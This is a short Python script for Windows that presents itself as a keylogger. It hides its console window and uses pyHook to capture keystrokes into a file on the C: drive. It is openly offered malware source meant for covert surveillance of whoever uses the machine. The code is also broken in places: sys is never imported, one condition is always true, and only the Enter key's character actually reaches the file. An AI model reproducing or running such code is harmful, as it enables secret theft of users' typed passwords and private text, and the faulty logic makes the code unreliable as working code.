# Python code for keylogger
# to be used in windows
import win32api
import win32console
import win32gui
import pythoncom
import pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


def OnKeyboardEvent(event):
    if event.Ascii == 5:
        sys.exit()
    if event.Ascii != 0 or 8:
        f = open("c:\\output.txt", "a")
        keylogs = chr(event.Ascii)
    if event.Ascii == 13:
        keylogs = keylogs + "\n"
        f.write(keylogs)
        f.close()


while True:
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()
